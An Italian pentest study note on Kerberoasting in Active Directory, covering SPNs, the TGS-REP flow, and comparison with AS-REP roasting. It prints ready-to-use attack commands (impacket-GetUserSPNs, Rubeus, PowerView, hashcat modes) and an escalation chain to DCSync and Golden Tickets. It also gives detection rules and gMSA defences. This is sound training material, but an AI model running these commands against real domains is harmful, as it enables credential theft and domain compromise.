---

tags:

- kerberoasting
- kerberos
- active-directory
- credential-harvesting
- offline-cracking
- hacking-exposed-7
- post-exploit aliases:
- Kerberoasting
- TGS-REP roasting
- SPN roasting

---

# Kerberoasting — Rubare e Crackare gli Hash dei Service Account

## 1. Il concetto

> **Kerberoasting** è una tecnica che permette a **qualsiasi utente autenticato del dominio** di richiedere ticket Kerberos (TGS-REP) per **service account**, ottenendo un blob crittografato che contiene la chiave del service account — crackabile offline.

Non è un exploit di una vulnerabilità — è un **abuso by design** del protocollo Kerberos, combinato con la cattiva abitudine umana di assegnare password deboli ai service account.

> [!abstract] Il pattern in una frase Sei autenticato → chiedi un ticket per un servizio → ricevi un blob cifrato con la chiave del service account → cracki la chiave offline → hai la password del service account.

---

## 2. Distinzione chiave — Kerberoasting vs AS-REP Roasting

Hai già studiato [[GetNPUsers - AS-REP Roasting]] in profondità. È il momento di metterli a fianco:

|Aspetto|AS-REP Roasting|Kerberoasting|
|---|---|---|
|**Quando avviene**|Fase AS (Authentication Service)|Fase TGS (Ticket Granting Service)|
|**Autenticazione richiesta**|❌ Unauthenticated|✅ Serve un account dominio qualsiasi|
|**Prerequisito sul target**|Account con `DONT_REQ_PREAUTH` (misconfig rara)|Account con **SPN** (comune — tutti i service account)|
|**Cosa cracki**|NT hash dell'utente target|NT hash del service account|
|**Hashcat mode**|18200 (RC4)|13100 (RC4) / 19600/19700 (AES)|
|**Rumore generato**|Eventi 4768 con encryption type sospetto|Eventi 4769 (più comuni e meno sospetti)|

> [!tip] La differenza pratica AS-REP Roasting è **raro** (richiede misconfiguration) ma **non richiede credenziali**. Kerberoasting è **comune** (qualsiasi service account è target) ma **richiede già un foothold autenticato**.

Su [[HTB - Sauna]] hai usato AS-REP perché non avevi credenziali. Con credenziali Sauna avresti potuto fare Kerberoasting su `svc_loanmgr` direttamente.

---

## 3. SPN — Service Principal Name

Il prerequisito tecnico è capire cosa sono gli **SPN**.

> Un SPN è un identificatore univoco di un'istanza di servizio in AD. Es. `MSSQLSvc/sql01.corp.local:1433` identifica il servizio MSSQL sulla porta 1433 di sql01.corp.local.

Gli SPN sono **registrati sugli account** in AD:

- Su **computer account** (default per HOST, CIFS, ecc. — automatici)
- Su **service account** (manuale — `setspn` quando installi un servizio custom)

```
svc_sql (service account)
├── SPN: MSSQLSvc/sql01.corp.local:1433
└── SPN: MSSQLSvc/sql01.corp.local
```

### Perché gli SPN sono il vettore

Quando un client vuole accedere a un servizio, deve sapere **a chi chiedere il TGS**. L'SPN è il modo: "Voglio un TGS per `MSSQLSvc/sql01.corp.local:1433`". Il KDC trova l'account che ha quel SPN registrato, e firma il TGS con la chiave di quell'account.

> [!warning] La conseguenza diretta Qualsiasi utente autenticato può richiedere un TGS per qualsiasi SPN. Il KDC **non controlla** se l'utente ha davvero bisogno di accedere al servizio — questo controllo lo fa il servizio stesso al momento dell'accesso. Il TGS viene emesso comunque.
> 
> Quindi: chiunque autenticato può ottenere un TGS-REP per **qualsiasi service account** del dominio.

---

## 4. Il meccanismo tecnico

```
┌──────────┐                                         ┌──────────┐
│  Client  │                                         │   KDC    │
│  (low    │                                         │   (=DC)  │
│   priv)  │                                         │          │
└─────┬────┘                                         └─────┬────┘
      │                                                    │
      │── AS-REQ (login normale con password) ────────────→│
      │                                                    │
      │←──── AS-REP: TGT valido ────────────────────────────│
      │                                                    │
      │── TGS-REQ con SPN=MSSQLSvc/sql01.corp.local ──────→│
      │   "voglio un ticket per questo servizio"          │
      │                                                    │
      │←──── TGS-REP ─────────────────────────────────────│
      │      contiene:                                     │
      │      - parte cifrata con session key (TUA)         │
      │      - parte cifrata con NT_hash(svc_sql) ←─── CRACKABILE
      │                                                    │
```

La parte cifrata con `NT_hash(svc_sql)` è quella che cracki offline. Se cracki l'hash NT, hai la **chiave del service account**, equivalente alla password.

> [!note] Perché è crackabile Il blob cifrato contiene **timestamp**, **session key**, e altri dati con struttura nota. Quando provi una password candidata:
> 
> 1. Calcoli `NT_hash(candidate)` = `MD4(unicode(candidate))`
> 2. Decifri il blob con quella chiave
> 3. Se il timestamp risultante è in formato sensato e il flag di validità è corretto → password trovata
> 
> Esattamente come AS-REP, ma su un blob diverso.

---

## 5. Eseguire l'attacco — i tool

### Cosa serve

|Dato|Note|
|---|---|
|**Credenziali di un account dominio qualsiasi**|Anche utente unprivileged|
|**Connettività al DC sulla porta 88** (Kerberos)|E 389 (LDAP) per enumerare SPN|
|**DC raggiungibile**|Domain Controller del dominio target|

### Con impacket-GetUserSPNs (Linux/Kali) — il preferito

```bash
# Enumera tutti gli account con SPN nel dominio
impacket-getuserspns corp.local/lowuser:Password123 -dc-ip 10.0.0.1

# Richiede TGS-REP per tutti loro e produce hash crackable
impacket-getuserspns corp.local/lowuser:Password123 -dc-ip 10.0.0.1 -request

# Output su file
impacket-getuserspns corp.local/lowuser:Password123 \
    -dc-ip 10.0.0.1 \
    -request \
    -outputfile kerberoast_hashes.txt

# Con NT hash invece di password (Pass-the-Hash → Kerberoast)
impacket-getuserspns corp.local/lowuser@10.0.0.1 -hashes :NTHASH -request
```

**Output tipico:**

```
ServicePrincipalName              Name        MemberOf
--------------------------------  ----------  --------
MSSQLSvc/sql01.corp.local:1433    svc_sql     CN=Domain Users,...
HTTP/web01.corp.local             svc_web     CN=Domain Users,...

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$abc123def456...
```

Il prefisso `$krb5tgs$23$` indica RC4 (mode hashcat 13100).

### Con Rubeus (Windows)

```powershell
# Kerberoast tutti gli account con SPN
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast un utente specifico
Rubeus.exe kerberoast /user:svc_sql

# Forza AES (raccomandato in domini AES-only, evita detection di RC4)
Rubeus.exe kerberoast /aes
```

### Con PowerView

```powershell
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
```

---

## 6. Crackare l'hash — hashcat

Hai già la nota [[hashcat]] con i modi. Ripasso veloce:

```bash
# Mode 13100 — TGS-REP RC4 (default su domini misti o vecchi)
hashcat -m 13100 -a 0 hashes.txt rockyou.txt -O

# Con rules per ampliare wordlist
hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# Mode 19600/19700 per AES (se il dominio forza AES)
hashcat -m 19600 -a 0 hashes_aes128.txt rockyou.txt -O
hashcat -m 19700 -a 0 hashes_aes256.txt rockyou.txt -O
```

> [!warning] AES vs RC4 — la corsa agli armamenti
> 
> - **RC4 (13100)**: ~1.5 GH/s su RTX 3080 → 8 char password lower+digit in minuti
> - **AES256 (19700)**: ~250 kH/s → stessa password potrebbe servire ore/giorni
> 
> Per questo gli attaccanti **forzano RC4** chiedendo TGS con encryption type specifico. Rubeus ha l'opzione `/rc4` per questo. Difensori che disabilitano RC4 a livello dominio rendono Kerberoasting molto più costoso.

---

## 7. Perché Kerberoasting funziona così bene

Il design Kerberos assume che le chiavi dei service account siano **machine-generated** (32+ caratteri di entropia random). Nella pratica:

|Realtà|Conseguenza|
|---|---|
|Service account password set **manualmente** da sysadmin|"Password2023!", "Backup#2024", "SqlSvc1!"|
|Service account password **mai cambiata**|"Password set 2014" ancora in uso nel 2026|
|Password riusate tra service account|Crackato uno → forse cracki altri|
|Domini che permettono RC4 per compatibility|Crack veloce|
|Service account spesso **privilegiati**|Spesso Domain Admin o equivalente|

> [!tip] La realtà operativa Il **90% degli ambienti AD** che vengono pentestati ha almeno un service account Kerberoastable con password debole. È statisticamente garantito trovarne uno.

---

## 8. La power escalation — service account spesso sono privilegiati

Service account legacy spesso sono **molto privilegiati**. Esempi tipici trovati nei pentest:

|Service account|Privilegi tipici|
|---|---|
|`svc_backup`|Domain Admin (per backuppare DC)|
|`svc_sql`|Local Admin su DB server, a volte DA|
|`svc_exchange`|Spesso Domain Admin storicamente|
|`svc_sccm`|Privilegi diffusi (deploy software)|
|`svc_monitoring`|Read everywhere|

Se cracki un Kerberoast e l'account è Domain Admin → game over immediato senza neanche Pass-the-Hash o lateral movement.

### Verifica privilegi dopo crack

```bash
# Verifica gruppi dell'utente crackato
nxc smb dc01.corp.local -u svc_sql -p 'P@ssw0rd2023' --groups
nxc ldap dc01.corp.local -u svc_sql -p 'P@ssw0rd2023' --groups
```

---

## 9. Pattern d'uso dell'hash crackato

Una volta crackato un service account:

```
Password crackata di svc_sql
    ↓
1. Login diretto come svc_sql (psexec, evil-winrm)
    → eseguo come quell'account
    ↓
2. NT hash della password → Pass-the-Hash dove serve
    ↓
3. Hash NT → Silver Ticket forgery ([[silver_ticket]])
    → per quel servizio specifico, stealth massima
    ↓
4. Se privilegiato → DCSync, Domain Admin operations
    ↓
5. Persistenza via [[golden_ticket]] se ottieni krbtgt
```

> [!note] Il chain completo da Kerberoasting a domain compromise Account low-priv → Kerberoasting → crack → service account Domain Admin → DCSync → krbtgt hash → Golden Ticket → persistenza decennale.
> 
> Questo è uno degli attack path più comuni nei red team engagement.

---

## 10. Detection

### Event ID 4769 — la firma

Ogni TGS request genera **Event 4769** sul DC. Per Kerberoasting, indicatori:

|Indicatore|Cosa cercare|
|---|---|
|**Encryption type 0x17** (RC4)|Su domini configurati per AES, RC4 = segnale forte|
|**Stesso user che richiede molti SPN diversi** in poco tempo|Un utente normale chiede pochi servizi specifici|
|**Service accounts come target**|TGS per account con SPN registrati = potenziale Kerberoasting|
|**Failure code "0x0"** ma con encryption type sospetto|Anomalia|

### Regola SIEM tipica

```
EventCode=4769 
  AND (TicketEncryptionType="0x17" OR TicketEncryptionType="0x18")
  AND ServiceName=service_account_with_spn
  GROUP BY TargetUserName
  HAVING COUNT(DISTINCT ServiceName) > 5 IN 5min
```

Un utente che richiede TGS per 10+ service account diversi in pochi minuti = quasi certamente Kerberoasting.

### Tool di detection

- **Microsoft Defender for Identity** (ex-Azure ATP) — analytics nativa
- **PingCastle** — audit AD con check su service account
- **BloodHound** non rileva l'attacco ma identifica i target probabili

---

## 11. Difese

### Primarie

|Difesa|Come funziona|
|---|---|
|**gMSA (Group Managed Service Accounts)**|Password automatica, 240+ char entropy, rotation 30 giorni → unrackable|
|**MSA (Managed Service Accounts)**|Versione precedente di gMSA, simile principio|
|**Password complesse per service account**|25+ caratteri random → crack diventa infattibile|
|**Disabilita RC4**|`msDS-SupportedEncryptionTypes` = solo AES → crack 1000x più lento|
|**Rimuovi SPN inutili**|Service account senza SPN registrato = non Kerberoastable|

### Secondarie

|Difesa|Come funziona|
|---|---|
|**Monitoring Event 4769**|SIEM rule come sopra|
|**Principle of Least Privilege**|Service account NON Domain Admin → blast radius limitato|
|**Tier separation**|Service account critici in Tier 0, isolati|
|**Honey SPN**|Service account "esca" con SPN registrato, monitorato 24/7|

### Implementare gMSA — la difesa definitiva

```powershell
# Su un DC, come Domain Admin
# 1. Crea key per gMSA
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# 2. Crea un gMSA
New-ADServiceAccount -Name "gmsa_sql" -DNSHostName "sql01.corp.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SQL01$"

# 3. Installa sul server target
Install-ADServiceAccount -Identity "gmsa_sql"

# 4. Configura il servizio per usarlo
# La password viene generata da AD, ruotata ogni 30 giorni automaticamente,
# mai conosciuta da un essere umano
```

Una volta in gMSA, il service account è **effettivamente non-Kerberoastable** — anche se ottieni l'hash via Kerberoasting, l'entropy della password lo rende non crackabile in tempi umani.

---

## 12. Methodology end-to-end

```
1. Foothold con credenziali low-priv
   (phishing, AS-REP, password spraying, ecc.)
        ↓
2. Enumeration SPN
   impacket-getuserspns corp.local/user:pass -dc-ip <DC>
        ↓
3. Richiesta TGS-REP per tutti gli account con SPN
   impacket-getuserspns ... -request -outputfile hashes.txt
        ↓
4. Crack offline
   hashcat -m 13100 hashes.txt rockyou.txt -O
        ↓
5. Triage account crackati
   - Verifica privilegi: nxc ldap ... --groups
   - Priorità a Domain Admin / Enterprise Admin
        ↓
6. Uso credenziali
   - Login diretto (Lateral Movement)
   - Pass-the-Hash (NT hash della password)
   - Silver Ticket (per persistenza stealth)
   - Se DA → DCSync → Golden Ticket
```

---

## Takeaways

1. **Kerberoasting** = chiunque autenticato può richiedere TGS per qualsiasi SPN → blob crackable offline
2. **Differenza chiave con AS-REP**: Kerberoasting **richiede** credenziali, AS-REP no
3. **Il vettore funziona perché** i service account hanno spesso password umane deboli, non machine-generated
4. **Hashcat mode 13100** (RC4) è il comune — molto più veloce di AES (19600/19700)
5. **Service account spesso sono privilegiati** (DA, Local Admin) → ottieni le chiavi del regno crackando uno solo
6. **Difesa definitiva**: **gMSA** — password auto-rotated, 240+ char entropy → unrackable
7. **Detection chiara**: Event 4769 con RC4 + molti SPN diversi richiesti da stesso utente
8. **Workflow tipico**: low-priv → Kerberoast → DA crackato → DCSync → Golden Ticket = total persistence

---

## Wiki-links

- [[GetNPUsers - AS-REP Roasting]]
- [[Golden Ticket]]
- [[Silver Ticket]]
- [[dcsync]]
- [[Pass-the-Hash]]
- [[Lateral Movement]]
- [[Privilege Escalation Windows]]
- [[Active Directory (AD)]]
- [[HTB - Sauna]]
- [[hashcat]]
- [[impacket]]
- [[bloodhound]]
- [[gmsa]]
- [[mitre_attck]]
- [[hacking_exposed_7_windows]]